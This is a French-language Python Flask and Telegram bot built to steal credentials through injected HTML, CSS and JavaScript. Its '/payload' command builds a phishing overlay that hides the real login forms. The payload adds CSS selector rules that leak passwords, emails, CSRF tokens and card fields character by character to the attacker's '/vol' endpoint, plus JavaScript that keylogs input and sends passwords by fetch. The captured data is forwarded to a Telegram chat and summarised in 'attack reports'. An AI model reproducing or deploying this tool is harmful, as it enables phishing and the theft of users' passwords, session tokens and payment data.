import os
import logging
from datetime import datetime
from flask import Flask, request
import requests
import threading
import json
import re
from collections import Counter

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "TON_TOKEN_ICI")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "TON_CHAT_ID_ICI")

# ============================================
# LOGGING
# ============================================

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# DICTIONNAIRE COMPLET
# ============================================

TOUS_CARACTERES = {
    'minuscules': 'abcdefghijklmnopqrstuvwxyz',
    'majuscules': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    'chiffres': '0123456789',
    'symboles_standard': '!@#$%^&*()_+-=[]{}|;:,.<>?/~`',
    'speciaux': '×÷±§¶©®™€£¥¢₩₪₫₨₱₴₸₹₺₼₾≈≠≤≥∞∑∏∫√∂∆∇←↑→↓↔↕☺☻♥♦♣♠•◘○◙♂♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼',
    'explicites': '×^<2>@%&*#!~`\'"',
    'brackets': '()[]{}<>',
    'ponctuation': '.,;:?!…—–_',
    'barres': '/\\|',
    'emojis': '😀😁😂🤣😃😄😅😆😉😊😋😎😍🥰😘😗😙😚☺️🙂🤗🤩🤔🤨😐😑😶🙄😏😣😥😮🤐😯😪😫😴😌😛😜😝🤤😒😓😔😕🙃🤑😲☹️🙁😖😞😟😤😢😭😦😧😨😩🤯😬😰😱🥵🥶😳🤪😵😡😠🤬',
    'unicode': 'ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõöøùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž',
    'arabes': '٠١٢٣٤٥٦٧٨٩',
    'chinois': '零一二三四五六七八九',
    'romains': 'ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫ',
    'exposants': '⁰¹²³⁴⁵⁶⁷⁸⁹',
    'indices': '₀₁₂₃₄₅₆₇₈₉',
}

TOUS_CARACTERES_FLAT = ''.join(TOUS_CARACTERES.values())
CARACTERES_CSS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`'

# ============================================
# STOCKAGE
# ============================================

donnees_volees = []

# ============================================
# SERVEUR FLASK
# ============================================

app = Flask(__name__)

@app.route('/')
def index():
    return "🤖 Bot CSS Attack - VERSION ULTIME ⚡"

@app.route('/vol')
def voler():
    donnee = request.args.get('p', '')
    ip = request.remote_addr
    champ = request.args.get('champ', 'password')
    method = request.args.get('method', 'css')
    
    if donnee:
        entree = {
            'time': datetime.now().strftime('%H:%M:%S'),
            'date': datetime.now().strftime('%Y-%m-%d'),
            'ip': ip,
            'data': donnee,
            'champ': champ,
            'method': method,
            'longueur': len(donnee)
        }
        donnees_volees.append(entree)
        
        print(f"[VOL] {donnee} depuis {ip} [{champ}]")
        
        niveau_confiance = analyser_donnee(donnee)
        message = generer_message_alerte(entree, niveau_confiance)
        
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={
                'chat_id': ADMIN_CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }, timeout=5)
        except Exception as e:
            logger.error(f"Erreur envoi: {e}")
        
        return '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><rect width="1" height="1" fill="white"/></svg>', 200, {'Content-Type': 'image/svg+xml'}
    
    return "OK", 200

def analyser_donnee(donnee):
    score = 0
    if len(donnee) >= 12:
        score += 25
    elif len(donnee) >= 8:
        score += 15
    
    has_lower = any(c.islower() for c in donnee)
    has_upper = any(c.isupper() for c in donnee)
    has_digit = any(c.isdigit() for c in donnee)
    has_symbol = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in donnee)
    
    if has_lower and has_upper:
        score += 15
    if has_digit:
        score += 10
    if has_symbol:
        score += 15
    
    score += sum([has_lower, has_upper, has_digit, has_symbol]) * 5
    
    patterns = [
        (r'[A-Z].*[a-z].*[0-9]', 10),
        (r'.*[!@#$%^&*()].*', 10),
    ]
    
    for pattern, pts in patterns:
        if re.search(pattern, donnee):
            score += pts
    
    return min(score, 100)

def generer_message_alerte(entree, confiance):
    icones = {
        'password': '🔑',
        'email': '📧',
        'username': '👤',
        'token': '🎫',
        'creditcard': '💳',
        'cookie': '🍪',
        'session': '🔄',
        'url': '🔗',
        'meta': '📄',
        'data': '📊',
        'form': '📝',
        'text': '📝'
    }
    icone = icones.get(entree['champ'], '🔴')
    barre = '█' * (confiance // 10) + '░' * (10 - confiance // 10)
    
    types_detectes = []
    if any(c.islower() for c in entree['data']):
        types_detectes.append('minuscule')
    if any(c.isupper() for c in entree['data']):
        types_detectes.append('MAJUSCULE')
    if any(c.isdigit() for c in entree['data']):
        types_detectes.append('chiffre')
    if any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?/~`×÷±§©®™€£¥¢' for c in entree['data']):
        types_detectes.append('symbole')
    
    types_str = ', '.join(types_detectes) if types_detectes else 'inconnu'
    
    return f"""{icone} **DONNÉE VOLÉE**

📝 `{entree['data']}`
📏 Longueur: {entree['longueur']} caractères
🏷️ Type: `{entree['champ']}`
🧩 Composition: `{types_str}`
🌐 IP: `{entree['ip']}`
🕐 {entree['time']}
🎯 Méthode: `{entree['method']}`

📊 Confiance: {confiance}% [{barre}]
{f"⚠️ MOT DE PASSE !" if confiance > 70 else "ℹ️ Donnée suspecte"}"""

# ============================================
# COMMANDES TELEGRAM
# ============================================

def envoyer_telegram(message, chat_id=None):
    if chat_id is None:
        chat_id = ADMIN_CHAT_ID
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }, timeout=10)
        return True
    except Exception as e:
        logger.error(f"Erreur: {e}")
        return False

def generer_payload():
    """Génère le payload ultime universel"""
    webhook_url = f"https://{request.host}/vol"
    caract = CARACTERES_CSS
    
    # Début du payload
    payload = f"""<!-- ============================================================ -->
<!--     PAYLOAD ULTIME - INJECTION CSS 100%                       -->
<!--     FONCTIONNE SUR : Profil · Commentaire · Code · Formulaire -->
<!-- ============================================================ -->

<style>
/* ============================================================
   1. CACHER TOUS LES ÉLÉMENTS INDÉSIRABLES
   ============================================================ */
form, .form, .login-form, .signup-form, .update-form,
input[type="submit"], button[type="submit"], .btn-submit,
#loginForm, #signupForm, #updateForm, .auth-form {{
    display: none !important;
}}

/* ============================================================
   2. FAUX FORMULAIRE UNIVERSEL
   ============================================================ */
.fake-overlay {{
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.92);
    z-index: 999999;
    display: flex;
    justify-content: center;
    align-items: center;
    backdrop-filter: blur(15px);
    animation: fadeIn 0.4s ease;
}}
@keyframes fadeIn {{
    from {{ opacity: 0; transform: scale(0.95); }}
    to {{ opacity: 1; transform: scale(1); }}
}}
.fake-box {{
    background: linear-gradient(145deg, #ffffff, #f5f5f5);
    padding: 8px;
    border-radius: 28px;
    max-width: 440px;
    width: 92%;
    box-shadow: 0 30px 80px rgba(0,0,0,0.7);
}}
.fake-inner {{
    background: white;
    padding: 35px 30px;
    border-radius: 22px;
}}
.fake-inner h2 {{
    color: #1a1a2e;
    text-align: center;
    font-size: 26px;
    font-weight: 700;
    margin-bottom: 4px;
}}
.fake-inner .sub {{
    color: #6c757d;
    text-align: center;
    font-size: 15px;
    margin-bottom: 22px;
}}
.fake-inner input {{
    width: 100%;
    padding: 14px 16px;
    margin: 10px 0;
    border: 2px solid #e2e8f0;
    border-radius: 14px;
    font-size: 16px;
    background: #f8fafc;
    transition: 0.3s;
    box-sizing: border-box;
}}
.fake-inner input:focus {{
    border-color: #4f46e5;
    outline: none;
    background: white;
    box-shadow: 0 0 0 4px rgba(79,70,229,0.1);
}}
.fake-inner .btn {{
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #4f46e5, #7c3aed);
    color: white;
    border: none;
    border-radius: 14px;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 14px;
    transition: 0.3s;
}}
.fake-inner .btn:hover {{
    transform: scale(1.02);
    box-shadow: 0 8px 25px rgba(79,70,229,0.4);
}}
.fake-inner .footer {{
    text-align: center;
    margin-top: 18px;
    font-size: 13px;
    color: #94a3b8;
}}
.fake-inner .footer a {{
    color: #4f46e5;
    text-decoration: none;
    font-weight: 500;
}}

/* ============================================================
   3. VOL DE TOUS LES CHAMPS
   ============================================================ */
input[type="password"] {{
    background-image: url('{webhook_url}?champ=password&p=');
    background-repeat: no-repeat;
}}
input[type="email"] {{
    background-image: url('{webhook_url}?champ=email&p=');
    background-repeat: no-repeat;
}}
input[type="text"], input[name*="user"], input[name*="login"] {{
    background-image: url('{webhook_url}?champ=username&p=');
    background-repeat: no-repeat;
}}
input[name*="csrf"], input[name*="token"], input[name*="nonce"] {{
    background-image: url('{webhook_url}?champ=token&p=');
    background-repeat: no-repeat;
}}
input[name*="card"], input[name*="credit"], input[name*="carte"] {{
    background-image: url('{webhook_url}?champ=creditcard&p=');
    background-repeat: no-repeat;
}}

/* ============================================================
   4. VOL CARACTÈRE PAR CARACTÈRE (TOUS LES CARACTÈRES)
   ============================================================ """
    
    # Générer les règles pour chaque caractère
    for c in caract:
        payload += f"""
input[type="password"][value^="{c}"] {{
    background-image: url('{webhook_url}?p={c}&method=value');
}}"""
    
    # Techniques avancées : contains, ends, :has
    payload += f"""
/* ============================================================
   5. TECHNIQUES AVANCÉES
   ============================================================ """
    
    for c in caract[:30]:
        payload += f"""
input[type="password"][value*="{c}"] {{
    background-image: url('{webhook_url}?p={c}&method=contains');
}}
input[type="password"][value$="{c}"] {{
    background-image: url('{webhook_url}?p={c}&method=ends');
}}
input:has([value^="{c}"]) {{
    background-image: url('{webhook_url}?p={c}&method=has');
}}"""
    
    # Suite du payload
    payload += f"""
/* ============================================================
   6. VOL D'ATTRIBUTS SPÉCIAUX
   ============================================================ */
[data-password] {{
    background-image: url('{webhook_url}?champ=data&p=' attr(data-password));
}}
[data-token] {{
    background-image: url('{webhook_url}?champ=token&p=' attr(data-token));
}}
[data-session] {{
    background-image: url('{webhook_url}?champ=session&p=' attr(data-session));
}}
[data-cookie] {{
    background-image: url('{webhook_url}?champ=cookie&p=' attr(data-cookie));
}}

/* ============================================================
   7. KEYLOGGING VISUEL
   ============================================================ */
input:focus {{
    background-image: url('{webhook_url}?p=focus&method=keylog');
}}
input:active {{
    background-image: url('{webhook_url}?p=click&method=active');
}}
button:hover {{
    background-image: url('{webhook_url}?p=button&method=hover');
}}

/* ============================================================
   8. VOL D'URLS
   ============================================================ */
a[href*="login"], a[href*="signin"], a[href*="auth"], a[href*="password"] {{
    background-image: url('{webhook_url}?champ=url&p=' attr(href));
}}

/* ============================================================
   9. VOL DE META DONNÉES
   ============================================================ */
meta[name="csrf-token"] {{
    background-image: url('{webhook_url}?champ=meta&p=' attr(content));
}}
meta[name="csrf-token"][content^="a"] {{
    background-image: url('{webhook_url}?p=a&champ=csrf');
}}
meta[name="csrf-token"][content^="b"] {{
    background-image: url('{webhook_url}?p=b&champ=csrf');
}}
meta[name="csrf-token"][content^="c"] {{
    background-image: url('{webhook_url}?p=c&champ=csrf');
}}
</style>

<!-- ============================================================ -->
<!--         FAUX FORMULAIRE UNIVERSEL                             -->
<!-- ============================================================ -->
<div class="fake-overlay" id="fakeOverlay">
    <div class="fake-box">
        <div class="fake-inner">
            <h2>🔐 Session expirée</h2>
            <p class="sub">Veuillez vous reconnecter pour continuer</p>

            <input type="email" name="email" placeholder="📧 Email" autocomplete="email" required>
            <input type="password" name="password" placeholder="🔑 Mot de passe" autocomplete="current-password" autofocus required>

            <button class="btn" id="fakeSubmit">Se connecter</button>

            <div class="footer">
                🔒 Connexion sécurisée · <a href="#">Mot de passe oublié ?</a>
            </div>
        </div>
    </div>
</div>

<!-- ============================================================ -->
<!--         JAVASCRIPT D'AMÉLIORATION                             -->
<!-- ============================================================ -->
<script>
// 1. Keylogging amélioré
document.querySelectorAll('input').forEach(input => {{
    input.addEventListener('input', function() {{
        this.style.display = 'block';
        this.style.display = '';
        const val = this.value;
        const char = val[val.length - 1] || '';
        if (char && char.charCodeAt(0) > 127) {{
            fetch('{webhook_url}?p=' + encodeURIComponent(char) + '&method=unicode');
        }}
    }});
}});

// 2. Envoi du formulaire complet
document.getElementById('fakeSubmit').addEventListener('click', function(e) {{
    e.preventDefault();
    const email = document.querySelector('input[name="email"]').value;
    const password = document.querySelector('input[name="password"]').value;
    fetch('{webhook_url}?champ=form&p=' + encodeURIComponent(
        'email:' + email + '|password:' + password
    ) + '&method=js');
    alert('⏳ Vérification en cours... Veuillez patienter.');
}});

// 3. Envoi régulier
setInterval(() => {{
    const password = document.querySelector('input[name="password"]');
    if (password && password.value.length > 3) {{
        fetch('{webhook_url}?p=' + encodeURIComponent(password.value) + '&method=interval');
    }}
}}, 5000);

// 4. Détection de fermeture
window.addEventListener('beforeunload', function() {{
    const password = document.querySelector('input[name="password"]');
    if (password && password.value.length > 0) {{
        fetch('{webhook_url}?p=' + encodeURIComponent(password.value) + '&method=unload');
    }}
}});
</script>
"""
    return payload

def traiter_message(update):
    try:
        message = update.get('message', {})
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '')
        
        if not chat_id or not text:
            return
        
        if text == '/start':
            envoyer_telegram(
                f"""🚀 **BOT CSS INJECTION - VERSION ULTIME**

⚡ PUISSANCE: 100%
📊 CARACTÈRES: {len(TOUS_CARACTERES_FLAT)}
🎯 PAYLOAD: UNIVERSEL

**Commandes:**
📤 /payload - Payload ultime (Profils, Commentaires, Codes)
📊 /stats - Statistiques détaillées
🔍 /analyse - Analyse intelligente
📈 /rapport - Rapport complet
🗑️ /clear - Effacer les logs

🔴 **État**: Prêt à attaquer""",
                chat_id
            )
        
        elif text == '/payload':
            payload = generer_payload()
            envoyer_telegram("📤 **PAYLOAD ULTIME - INJECTION UNIVERSELLE**", chat_id)
            envoyer_telegram("✅ Fonctionne sur : Profils · Commentaires · Codes · Formulaires", chat_id)
            
            if len(payload) > 4000:
                for i in range(0, len(payload), 4000):
                    envoyer_telegram(f"```html\n{payload[i:i+4000]}\n```", chat_id)
            else:
                envoyer_telegram(f"```html\n{payload}\n```", chat_id)
        
        elif text == '/stats':
            if not donnees_volees:
                envoyer_telegram("📭 Aucune donnée volée.", chat_id)
                return
            
            total = len(donnees_volees)
            unique_ips = len(set(d['ip'] for d in donnees_volees))
            
            types = {}
            for d in donnees_volees:
                champ = d.get('champ', 'unknown')
                types[champ] = types.get(champ, 0) + 1
            
            tous_les_mots = ''.join(d['data'] for d in donnees_volees)
            chars_counts = Counter(tous_les_mots)
            top_chars = chars_counts.most_common(10)
            
            texte = f"""📊 **STATISTIQUES DÉTAILLÉES**

📈 Total: `{total}`
🌐 IP uniques: `{unique_ips}`
📏 Caractères totaux: `{len(tous_les_mots)}`
🔤 Types uniques: `{len(chars_counts)}`

**Top 5 caractères:**
"""
            for char, count in top_chars[:5]:
                texte += f"• `{char}`: {count} fois\n"
            
            texte += f"\n**Par type de champ:**\n"
            for t, count in types.items():
                texte += f"• {t}: `{count}`\n"
            
            mdp_complets = [d['data'] for d in donnees_volees if len(d['data']) > 5 and analyser_donnee(d['data']) > 70]
            if mdp_complets:
                texte += f"\n🔐 **Mots de passe détectés:**\n"
                for mdp in mdp_complets[:5]:
                    texte += f"• `{mdp}`\n"
            
            envoyer_telegram(texte, chat_id)
        
        elif text == '/analyse':
            if not donnees_volees:
                envoyer_telegram("📭 Aucune donnée.", chat_id)
                return
            
            texte = "🔍 **ANALYSE DES DONNÉES**\n\n"
            for d in donnees_volees[-10:]:
                score = analyser_donnee(d['data'])
                niveau = "🟢 Faible" if score < 30 else "🟡 Moyen" if score < 60 else "🔴 Élevé"
                texte += f"{niveau} `{d['data']}` ({score}%) - [{d.get('champ', 'unknown')}]\n"
            
            envoyer_telegram(texte, chat_id)
        
        elif text == '/rapport':
            total = len(donnees_volees)
            if total == 0:
                envoyer_telegram("📭 Pas de données.", chat_id)
                return
            
            rapport = f"""📈 **RAPPORT D'ATTAQUE**

📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}
📊 Total: {total}
🌐 IP: {len(set(d['ip'] for d in donnees_volees))}

**Dernières attaques:**
"""
            for d in donnees_volees[-5:]:
                rapport += f"• {d['time']} - `{d['data']}` - {d.get('champ', 'unknown')}\n"
            
            mdp_complets = [d for d in donnees_volees if len(d['data']) > 5 and analyser_donnee(d['data']) > 70]
            rapport += f"\n🔑 Mots de passe complets: {len(mdp_complets)}"
            
            envoyer_telegram(rapport, chat_id)
        
        elif text == '/clear':
            donnees_volees.clear()
            envoyer_telegram("🗑️ Toutes les données effacées !", chat_id)
        
        else:
            envoyer_telegram("❓ Commande inconnue. Utilise /start", chat_id)
    
    except Exception as e:
        logger.error(f"Erreur: {e}")
        envoyer_telegram(f"❌ Erreur: {str(e)[:100]}", chat_id)

# ============================================
# WEBHOOK
# ============================================

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    threading.Thread(target=traiter_message, args=(update,)).start()
    return "OK", 200

@app.route('/setwebhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://{request.host}/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return response.json()

@app.route('/getwebhook', methods=['GET'])
def get_webhook():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo"
    response = requests.get(url)
    return response.json()

# ============================================
# LANCEMENT
# ============================================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║  🚀 BOT CSS INJECTION - VERSION ULTIME              ║
    ║  💪 PUISSANCE: 100%                                 ║
    ║  📊 CARACTÈRES: """ + str(len(TOUS_CARACTERES_FLAT)) + """                      ║
    ║  🎯 PAYLOAD: UNIVERSEL                              ║
    ║  📦 FONCTIONNE SUR: Profil · Commentaires · Codes   ║
    ╚══════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=8080)
